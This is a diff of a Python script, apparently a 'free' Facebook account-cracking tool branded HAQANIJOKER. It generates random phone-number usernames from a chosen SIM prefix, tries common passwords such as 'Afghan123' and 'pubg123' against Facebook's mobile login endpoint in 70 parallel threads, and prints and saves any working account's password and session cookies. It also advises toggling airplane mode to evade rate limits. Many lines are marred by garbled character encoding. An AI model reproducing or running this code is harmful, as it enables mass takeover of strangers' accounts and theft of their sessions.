@@ -1091,15 +1091,15 @@ logo = """
 \033[1;34m/**//////** **********/**    **/**  **********/**  //**/**/**
 \033[1;35m/**     /**/**//////**//**  // **  /**//////**/**   //****/**
 \033[1;36m/**     /**/**     /** //******* **/**     /**/**    //***/**
-\033[1;37m//      // //      //   /////// // //      // //      /// // \033[1;32m HAQANI?😞🎭✌\033[1;37m 
+\033[1;37m//      // //      //   /////// // //      // //      /// // \033[1;32m HAQANI?ðð­â\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32mHAQANI??\033[1;37m
-[•] GITHUB     : \033[1;32mHAQANI??-????😞\033[1;37m
-[•] TOOL NAME  : \033[1;32mHAQANI??\033[1;37m
-[•] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
-[•] STATUS     : \033[1;32mFREE\033[1;37m
+[â¢] AUTHOR     : \033[1;32mHAQANIJOKER\033[1;37m
+[â¢] GITHUB     : \033[1;32mHAQANI-JOKERð\033[1;37m
+[â¢] TOOL NAME  : \033[1;32mHAQANIJOKER\033[1;37m
+[â¢] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
+[â¢] STATUS     : \033[1;32mFREE\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[â¢] \033[1;37mVERSION    :\033[1;32m 0.2 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1108,7 +1108,7 @@ loop = 0
 oks = []
 cps = []
 try:
-    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
+    print('\n\033[1;37m[â¢] WAIT CHECKING FOR UPDATE')
     proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
     update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
@@ -1135,7 +1135,7 @@ def rehan():
 	print('[4] CONTACT WITH OWNER')
 	print('[0] EXIT')
 	lines()
-	gh = input('[•] CHOOSE : ')
+	gh = input('[â¢] CHOOSE : ')
 	if gh =='1':
 		menu()
 	elif gh =='2':
@@ -1145,11 +1145,11 @@ def rehan():
 	elif gh =='4':
 		os.system('xdg-open https://www.facebook.com/profile.php?id=RehanTalpur786')
 	elif gh =='0':
-		print('[•] THANKS FOR USE ')
+		print('[â¢] THANKS FOR USE ')
 		time.sleep(3)
 		exit()
 	else:
-		print('[•] CHOOSE CORRECT OPTION')
+		print('[â¢] CHOOSE CORRECT OPTION')
 		time.sleep(2)
 		rehan()
 
@@ -1157,13 +1157,13 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
-	print('[2] ALI + KHAN PASS')
-	print('[3] MALIK + BALOCH PASS')
+	print('[2] Afghan + 100200 PASS')
+	print('[3] 10002000 + 900900 PASS')
 	print('[4] BEST FOR PUBG IDS')
 	print('[5] BEST FOR FREE FIRE IDS')
 	print('[0] EXIT TO MAIN MENU')
 	lines()
-	opt = input('[•] CHOOSE: ')
+	opt = input('[â¢] CHOOSE: ')
 	if opt =='1':
 		svn_digit()
 	elif opt =='2':
@@ -1177,7 +1177,7 @@ def menu():
 	elif opt =='0':
 		rehan()
 	else:
-		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
+		print('\n\033[1;37m[â¢] Choose valid option\033[0;97m')
 		time.sleep(2)
 		menu()
 
@@ -1187,14 +1187,14 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[â¢] EXAMPLE :9370,9378,9379,9376.ETC')
 	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	kode = input('[â¢]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1202,16 +1202,16 @@ def svn_digit():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
 			pwx = [guru,kode+guru]
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
 	input('Press Enter To Go Back To Menu')
 	rehan()
@@ -1222,14 +1222,14 @@ def ali_khan():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :9370,9376,9377,9378.ETC')
+	print('[â¢] EXAMPLE :9370,9376,9377,9378.ETC')
 	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	kode = input('[â¢]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1237,16 +1237,16 @@ def ali_khan():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mAfghan123 + 100200')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'Afghanistan','Afghan123','Afghan12345','khan123','malik123']
+			pwx = [guru,'Afghanistan','Afghan123','Afghan12345','100200','malik123']
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
 	input('Press Inter To Back Menu')
 	rehan()
@@ -1263,14 +1263,14 @@ def malik_baloch():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :9370,9376,9377,9378.ETC')
+	print('[â] EXAMPLE :9370,9376,9377,9378.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1278,16 +1278,16 @@ def malik_baloch():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mMALIK + AFGHAN💪')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
 			pwx = [guru,'malik123','Afghanistan','Afghan123']
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
 	input('Press Inter To Back Menu')
 	rehan()
@@ -1298,14 +1298,14 @@ def pubg():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :9370,9376,9377,9378.ETC')
+	print('[â] EXAMPLE :9370,9376,9377,9378.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1313,16 +1313,16 @@ def pubg():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mPUBG')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
 			pwx = [guru,'pubg123','Afghanistan','afghanistan']
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
 	input('Press Enter To Go Back To Menu')
 	rehan()
@@ -1333,14 +1333,14 @@ def ff():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :9370,9376,9377,9378.ETC')
+	print('[â] EXAMPLE :9370,9376,9377,9378.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1348,16 +1348,16 @@ def ff():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khan123','khankhan','afghan123','afghan786']
+			pwx = [guru,'pubg123','pubgking','afghan123','afghan786']
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
 	input('Press Enter To Go Back To Menu')
 	rehan()
@@ -1368,14 +1368,14 @@ def bd():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
+	print('[â¢] EXAMPLE : 092***,92***,92****,92****,.ETC')
 	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	kode = input('[â¢]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print('[•] MAX LIMIT [50000]')
+	print('[â¢] MAX LIMIT [50000]')
 	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
+	limit = int(input('[â¢] ENTER LIMIT :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
@@ -1383,16 +1383,16 @@ def bd():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		print('[â¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[â¢] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[â¢] METHOD YOU CHOOSE : \033[1;32mBANGLA')
+		print('\x1b[1;97m[â¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'+88','bangladish']
+			pwx = [guru,'+93','Afghanistan']
 			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
+	print('[â] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
 	input('Press Inter To Back Menu')
 	rehan()
@@ -1404,30 +1404,30 @@ def chos():
     os.geteuid
     os.system("clear")
     print(logo)
-    print('\x1b[1;91m[•] YOUR SIM CODE: ')
+    print('\x1b[1;91m[â¢] YOUR SIM CODE: ')
     lines()
     code = input(' Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[•] MAX LIMIT [50000]')
+    print('[â¢] MAX LIMIT [50000]')
     lines()
-    limit = int(input('[•] LIMIT :  '))
+    limit = int(input('[â¢] LIMIT :  '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     os.system("clear")
     print(logo)
-    print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
+    print('[â¢] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
     lines()
-    passx = int(input("[•] ENTER PASSWORD LIMIT : "))
+    passx = int(input("[â¢] ENTER PASSWORD LIMIT : "))
     HamiiID = []
     os.system('clear')
     print(logo)
-    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
+    print('[â¢] EXAMPLE : khan12345,afghanistan,Afghan123,Etc')
     lines()
     for bilal in range(passx):
-        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
+        pww = input(f"[â¢] ENTER PASSWORDS {bilal+1} : ")
         HamiiID.append(pww)
     with ThreadPool(max_workers=70) as manshera:
         os.system('clear')
@@ -1468,25 +1468,25 @@ def fcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'p.facebook.com',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-           'accept-language': 'en-GB,en-NZ;q=0.9,en-AS;q=0.8,en-US;q=0.7,en;q=0.6',
-           'cache-control': 'max-age=0',
-           'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro}
-            lo = session.post('https://x.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-GB,en-NZ;q=0.9,en-AS;q=0.8,en-US;q=0.7,en;q=0.6',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+            lo = session.post('https://p.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[HAQANI??-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[JOKER-OK] '+cid+'|'+ps+'\033[0;97m\n[ââð]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('RDX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
@@ -1500,7 +1500,7 @@ def fcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97m????😞\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97m????ð\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
